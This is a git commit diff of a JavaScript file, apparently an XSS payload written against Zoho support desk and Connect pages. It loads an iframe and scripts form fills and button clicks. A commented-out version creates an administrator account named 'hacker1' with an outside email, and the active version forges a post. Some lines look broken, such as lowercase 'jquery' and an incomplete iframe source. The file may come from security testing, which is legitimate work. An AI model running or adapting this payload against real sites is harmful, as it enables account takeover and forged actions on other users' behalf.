c9f2a804e66aaf65b0f27618f0eec9aa2b964b6f
Nandha30 <mail.nandha30@gmail.com>
2016-09-26 21:24:00 +0530

    Update a.js
    ghhgfh

--- a.js
+++ a.js
@@ -1,19 +1,28 @@
+//Closing a Ticket...
 //var statusVal = getClosedLabel();assignValue('Cases','6b28c32dddd03edf3e9898aa0dd1498de612657a51fd5fbe',encodeURIComponent(statusVal),'Status');
 
-var iframe = jQuery("<iframe></iframe>");
-jQuery(iframe).attr("src","Security.do?actionName=newUser&frameorigin=https://supportdesk.localzoho.com");
+//Adding an agent...
+// var iframe = jQuery("<iframe></iframe>");
+// jQuery(iframe).attr("src","Security.do?actionName=newUser&frameorigin=https://supportdesk.localzoho.com");
+// jQuery(iframe).attr("onload","adduser_hack()");
+
+// jQuery("body").append(iframe);
+
+// function adduser_hack(){
+// jQuery(iframe).contents().find('#lastName').val("hacker1");
+// jQuery(iframe).contents().find('#j_username').val("nandha@gmail.com");
+// jQuery(iframe).contents().find("#perType_Admin").click();
+// jQuery(iframe).contents().find("#savebtn").click();
+// }
+
+//Adding post in Connect...
+var iframe = jquery("<iframe></iframe>");
+jQuery(iframe).attr("src","&frameorigin=https://connect.localzoho.com");
 jQuery(iframe).attr("onload","adduser_hack()");
 
 jQuery("body").append(iframe);
 
-
-
-
-
-
 function adduser_hack(){
-jQuery(iframe).contents().find('#lastName').val("hacker1");
-jQuery(iframe).contents().find('#j_username').val("nandha@gmail.com");
-jQuery(iframe).contents().find("#perType_Admin").click();
-jQuery(iframe).contents().find("#savebtn").click();
+jQuery(iframe).contents().find('#newStreamContentarea').val("hacker1");
+jquery(iframe).contents().find('#addstreamButton').click();
 }
